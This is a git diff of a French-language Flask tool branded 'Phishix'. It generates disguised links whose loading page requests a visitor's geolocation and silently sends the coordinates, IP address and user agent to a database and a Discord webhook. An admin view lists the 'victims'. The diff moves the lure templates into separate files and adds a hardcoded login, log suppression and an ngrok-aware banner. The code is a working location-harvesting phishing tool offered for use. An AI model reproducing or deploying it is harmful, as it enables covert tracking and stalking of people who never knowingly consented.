@@ -1,17 +1,20 @@
-# geo_grab.py
-# Usage:
-#   pip install flask requests
-#   
-#   python legal_geo_dashboard.py
-#
-# Admin localhost : http://127.0.0.1:5000/admin
-# Ngrok Server : ngrok http 5000 --> https://<ngrok_url_generer>/admin
-
-
-from flask import Flask, render_template_string, request, redirect, url_for
+from flask import Flask, render_template, request, redirect, url_for, session
 import sqlite3, os, uuid, time, requests
+import flask.cli
+import subprocess
+import logging, warnings
 
+# -------------------------
+# Désactiver logs et warnings
+# -------------------------
+log = logging.getLogger('werkzeug')
+log.setLevel(logging.ERROR)
+flask.cli.show_server_banner = lambda *x: None
+warnings.filterwarnings("ignore")
+
+# -------------------------
 app = Flask(__name__)
+app.secret_key = "f3b9c6d7a1e048b2c5f9d6e8a7b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9"
 DB = "geo_links.db"
 
 # --------- Init DB ---------
@@ -38,118 +41,30 @@ def init_db():
     con.close()
 init_db()
 
-# --------- Templates ---------
-ADMIN_HTML = """
-<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<script src="https://cdn.tailwindcss.com"></script>
-<title>Dashboard Admin</title></head>
-<body class="bg-slate-900 text-slate-100 min-h-screen p-6">
-<div class="max-w-3xl mx-auto">
-<h1 class="text-2xl font-bold mb-4">Générer un lien pour obtenir la localisation</h1>
-<form method="post" class="space-y-3">
-<label class="block text-sm">Label (optionnel)<input name="label" class="w-full mt-1 p-2 rounded bg-slate-800"></label>
-<label class="block text-sm">Discord webhook URL<input name="webhook" required class="w-full mt-1 p-2 rounded bg-slate-800"></label>
-<div><button class="px-4 py-2 bg-rose-500 rounded">Générer le lien</button></div>
-</form>
-{% if link %}
-<div class="mt-6 p-4 bg-slate-800 rounded">
-<div class="text-sm">Lien généré :</div>
-<div class="mt-2 font-mono bg-black/30 p-2 rounded break-all"><a class="text-indigo-300" href="{{ link }}">{{ link }}</a></div>
-</div>
-{% endif %}
-<hr class="my-6 border-slate-700">
-<div><a class="text-sm text-slate-300" href="/events">Voir les victime</a></div>
-</div>
-</body></html>
-"""
+# --------- Auth ---------
+USERNAME = "Phishix"
+PASSWORD = "Phishix2025"
 
-GO_HTML = """
-<!doctype html>
-<html lang="fr">
-<head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Chargement…</title>
-<script src="https://cdn.tailwindcss.com"></script>
-<style>
-  html,body{height:100%;margin:0}
-</style>
-</head>
-<body class="bg-white flex items-center justify-center">
-  <div class="flex flex-col items-center space-y-4">
-    <svg class="animate-spin h-12 w-12 text-indigo-500" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
-      <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
-      <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8H4z"></path>
-    </svg>
-    <div class="text-gray-700 text-lg text-center">Veuillez autoriser la localisation pour continuer…</div>
-  </div>
+@app.route('/login', methods=['POST'])
+def login():
+    username = request.form.get("username")
+    password = request.form.get("password")
+    if username == USERNAME and password == PASSWORD:
+        session["logged_in"] = True
+    return redirect(url_for("admin"))
 
-<script>
-const link_id = "{{ link_id }}";
-
-function sendLocation(coords) {
-  fetch('/location/' + link_id, {
-    method: 'POST',
-    headers: {'Content-Type':'application/json'},
-    body: JSON.stringify({
-      lat: coords.latitude,
-      lon: coords.longitude,
-      acc: coords.accuracy,
-      ua: navigator.userAgent
-    })
-  }).finally(() => {
-    document.body.innerHTML = ""; // Page blanche après envoi
-  });
-}
-
-window.addEventListener('load', () => {
-  if (!navigator.geolocation) {
-    document.querySelector('div').textContent = "Géolocalisation non supportée par votre navigateur.";
-    return;
-  }
-  navigator.geolocation.getCurrentPosition(
-    (pos) => sendLocation(pos.coords),
-    (err) => {
-      document.querySelector('div').textContent = "Permission refusée ou erreur.";
-    },
-    { enableHighAccuracy:true, maximumAge:0, timeout:15000 }
-  );
-});
-</script>
-</body>
-</html>
-"""
-
-
-EVENTS_HTML = """
-<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<script src="https://cdn.tailwindcss.com"></script>
-<title>Événements consentis</title></head>
-<body class="bg-slate-950 text-slate-100 min-h-screen p-6">
-<div class="max-w-6xl mx-auto">
-<h1 class="text-2xl font-semibold mb-4">Événements consentis</h1>
-<table class="w-full text-sm border-separate border-spacing-y-2">
-<thead class="text-slate-300"><tr>
-<th class="text-left">Heure</th><th class="text-left">Label</th><th class="text-left">IP</th>
-<th class="text-left">UA</th><th class="text-left">Lat/Lon (±m)</th><th class="text-left">Maps</th></tr></thead>
-<tbody>
-{% for e in rows %}
-<tr class="bg-slate-900/60 rounded-xl">
-<td class="py-2 pr-4">{{ e.ts_h }}</td>
-<td class="py-2 pr-4">{{ e.label }}</td>
-<td class="py-2 pr-4 font-mono">{{ e.ip }}</td>
-<td class="py-2 pr-4 text-xs break-all">{{ e.ua }}</td>
-<td class="py-2 pr-4 font-mono">{{ '%.5f'%e.lat }}, {{ '%.5f'%e.lon }} (±{{ e.acc|int }}m)</td>
-<td class="py-2 pr-4"><a class="text-indigo-300 underline" href="https://www.google.com/maps?q={{ e.lat }},{{ e.lon }}" target="_blank">Maps</a></td>
-</tr>
-{% endfor %}
-</tbody></table></div></body></html>
-"""
+@app.route('/logout')
+def logout():
+    session.clear()
+    return redirect(url_for("admin"))
 
 # --------- Routes ---------
 @app.route('/admin', methods=['GET','POST'])
 def admin():
-    link=None
+    link = None
+    if not session.get("logged_in"):
+        return render_template("admin.html", link=None)
+
     if request.method=='POST':
         label = request.form.get('label','')
         webhook = request.form.get('webhook')
@@ -161,11 +76,11 @@ def admin():
                         (link_id, webhook, label, int(time.time())))
             con.commit(); con.close()
             link = url_for('go', link_id=link_id, _external=True)
-    return render_template_string(ADMIN_HTML, link=link)
+    return render_template("admin.html", link=link)
 
 @app.route('/go/<link_id>')
 def go(link_id):
-    return render_template_string(GO_HTML, link_id=link_id)
+    return render_template("go.html", link_id=link_id)
 
 @app.route('/location/<link_id>', methods=['POST'])
 def location(link_id):
@@ -180,7 +95,6 @@ def location(link_id):
     cur.execute("INSERT INTO events(link_id,ts,ip,ua,lat,lon,acc) VALUES (?,?,?,?,?,?,?)",
                 (link_id,int(time.time()),ip,ua,lat,lon,acc))
     con.commit()
-    # send webhook
     cur.execute("SELECT webhook,label FROM links WHERE id=?",(link_id,))
     row=cur.fetchone()
     con.close()
@@ -189,7 +103,8 @@ def location(link_id):
         content=f"📍 Position consentie\nLabel: {label}\nIP: {ip}\nUA: {ua}\nLat/Lon: {lat},{lon} (±{int(acc)}m)\nMaps: https://www.google.com/maps?q={lat},{lon}"
         try:
             requests.post(webhook, json={"content": content}, timeout=8)
-        except: pass
+        except:
+            pass
     return '',204
 
 @app.route('/events')
@@ -201,7 +116,43 @@ def events():
     rows=[dict(ts_h=time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(r['ts'])),
                ip=r['ip'], ua=r['ua'], lat=r['lat'], lon=r['lon'], acc=r['acc'], label=r['label'] or '') for r in cur.fetchall()]
     con.close()
-    return render_template_string(EVENTS_HTML, rows=rows)
+    return render_template("events.html", rows=rows)
 
+# --------- Banner coloré ---------
+def print_banner():
+    RED = "\033[91m"
+    GREEN = "\033[92m"
+    CYAN = "\033[96m"
+    YELLOW = "\033[93m"
+    RESET = "\033[0m"
+
+    ascii_banner = f"""{CYAN}
+██████╗ ██╗  ██╗██╗███████╗██╗  ██╗██╗██╗  ██╗
+██╔══██╗██║  ██║██║██╔════╝██║  ██║██║╚██╗██╔╝
+██████╔╝███████║██║███████╗███████║██║ ╚███╔╝ 
+██╔═══╝ ██╔══██║██║╚════██║██╔══██║██║ ██╔██╗ 
+██║     ██║  ██║██║███████║██║  ██║██║██╔╝ ██╗
+╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝
+                  by {YELLOW}Phishix{CYAN}
+{RESET}"""
+    print(ascii_banner)
+    print(f"{GREEN}🚀 Flask server démarré !{RESET}")
+    print(f"{CYAN}👉 Accès local   : {YELLOW}http://127.0.0.1:5000/admin{RESET}")
+
+    # Vérifie si ngrok tourne
+    try:
+        result = subprocess.check_output("tasklist", shell=True).decode(errors="ignore")
+        if "ngrok" in result.lower():
+            print(f"{CYAN}🌍 Ngrok semble être lancé (port 5000).{RESET}")
+            print(f"{CYAN}   Vérifie ton dashboard ngrok pour l’URL publique.{RESET}")
+        else:
+            print(f"{CYAN}ℹ️ Ngrok n'est pas détecté pour l'instant.{RESET}")
+    except:
+        print(f"{CYAN}ℹ️ Impossible de vérifier ngrok.{RESET}")
+
+    print(f"\n{GREEN}Appuie sur CTRL+C pour quitter.{RESET}\n")
+
+# --------- Run ---------
 if __name__=="__main__":
-    app.run(host='127.0.0.1', port=5000, debug=True)
+    print_banner()
+    app.run(host='127.0.0.1', port=5000, debug=False, use_reloader=False)
